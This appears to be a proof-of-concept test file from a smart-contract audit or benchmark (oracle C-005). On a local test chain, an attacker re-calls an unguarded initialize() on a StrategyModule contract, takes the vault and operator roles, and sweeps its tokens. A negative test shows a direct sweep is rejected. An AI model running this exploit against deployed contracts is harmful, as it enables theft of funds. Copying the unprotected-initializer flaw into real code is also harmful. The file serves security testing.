import assert from "node:assert/strict";
import { before, test } from "node:test";
import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";

let artifacts;

before(async () => {
  artifacts = await compileAll();
});

async function setup() {
  const chain = await makeChain();
  const [admin, intendedOperator, attacker] = chain.signers;
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const module = await deploy(artifacts, "StrategyModule", admin);
  await send(module.initialize(await admin.getAddress(), await intendedOperator.getAddress()));
  await send(token.mint(await module.getAddress(), ether(10)));
  assert.equal(await module.initialized(), true);
  return { admin, intendedOperator, attacker, token, module };
}

test("positive: arbitrary caller reinitializes roles and sweeps module funds", async () => {
  const { attacker, token, module } = await setup();
  const attackerAddress = await attacker.getAddress();
  const originalVault = await module.vault();
  const originalOperator = await module.operator();
  assert.notEqual(originalVault, attackerAddress);
  assert.notEqual(originalOperator, attackerAddress);

  await send(module.connect(attacker).initialize(attackerAddress, attackerAddress));
  assert.equal(await module.vault(), attackerAddress);
  assert.equal(await module.operator(), attackerAddress);
  await send(module.connect(attacker).sweep(await token.getAddress(), attackerAddress, ether(10)));

  assert.equal(await token.balanceOf(await module.getAddress()), 0n);
  assert.equal(await token.balanceOf(attackerAddress), ether(10));
  console.log(JSON.stringify({ oracle: "C-005-positive", originalVault, originalOperator, newVault: attackerAddress, newOperator: attackerAddress, attackerToken: String(await token.balanceOf(attackerAddress)) }));
});

test("negative: without reinitialization the same untrusted caller cannot sweep", async () => {
  const { attacker, token, module } = await setup();
  const attackerAddress = await attacker.getAddress();
  await expectRevert(module.connect(attacker).sweep(
    await token.getAddress(), attackerAddress, ether(10)
  ));
  assert.equal(await token.balanceOf(await module.getAddress()), ether(10));
  assert.equal(await token.balanceOf(attackerAddress), 0n);
  console.log(JSON.stringify({ oracle: "C-005-negative", directSweepRejected: true, moduleToken: String(await token.balanceOf(await module.getAddress())), attackerToken: "0" }));
});

